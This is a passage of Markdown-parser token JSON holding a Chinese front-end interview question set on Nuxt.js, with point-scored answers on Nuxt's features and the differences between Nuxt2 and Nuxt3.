目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","text":" 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt有哪些特性？\\n\\n","depth":2,"text":"nuxt有哪些特性？","tokens":[{"type":"text","raw":"nuxt有哪些特性？","text":"nuxt有哪些特性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"* **1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。\\n* **1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。\\n* **1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。\\n* **1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。\\n* **1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。\\n* **1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。\\n* **1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。\\n","task":false,"loose":false,"text":"**1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","tokens":[{"type":"text","raw":"**1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","text":"**1：** 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","text":" 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。\\n","task":false,"loose":false,"text":"**1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","tokens":[{"type":"text","raw":"**1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","text":"**1：** 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","text":" 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。\\n","task":false,"loose":false,"text":"**1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","tokens":[{"type":"text","raw":"**1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","text":"**1：** 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","text":" 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。\\n","task":false,"loose":false,"text":"**1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","tokens":[{"type":"text","raw":"**1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","text":"**1：** 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","text":" 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。\\n","task":false,"loose":false,"text":"**1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","tokens":[{"type":"text","raw":"**1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","text":"**1：** 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","text":" 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。\\n","task":false,"loose":false,"text":"**1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","tokens":[{"type":"text","raw":"**1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","text":"**1：** 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","text":" 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","task":false,"loose":false,"text":"**1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","tokens":[{"type":"text","raw":"**1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","text":"**1：** 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","text":" 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt2和nuxt3的区别\\n\\n","depth":2,"text":"nuxt2和nuxt3的区别","tokens":[{"type":"text","raw":"nuxt2和nuxt3的区别","text":"nuxt2和nuxt3的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。\\n* **1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。\\n* **1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。\\n* **1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。\\n* **2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。\\n","task":false,"loose":false,"text":"**1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","tokens":[{"type":"text","raw":"**1：** 性能方面：<br/>\\n\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\n\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","text":"**1：** 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能方面：","text":" 性能方面：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 ","text":"\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 ","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","text":"\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。\\n","task":false,"loose":false,"text":"**1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","tokens":[{"type":"text","raw":"**1：** 目录结构和文件约定：<br/>\\n\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n\\n允许更好地定制页面布局。<br/>\\n\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","text":"**1：** 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 目录结构和文件约定：","text":" 目录结构和文件约定：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。","text":"\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","text":"\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。\\n","task":false,"loose":false,"text":"**1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","tokens":[{"type":"text","raw":"**1：** TypeScript 支持：<br/>\\n\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n\\n开发体验更加友好。<br/>\\n\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","text":"**1：** TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TypeScript 支持：","text":" TypeScript 支持：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。","text":"\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","text":"\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 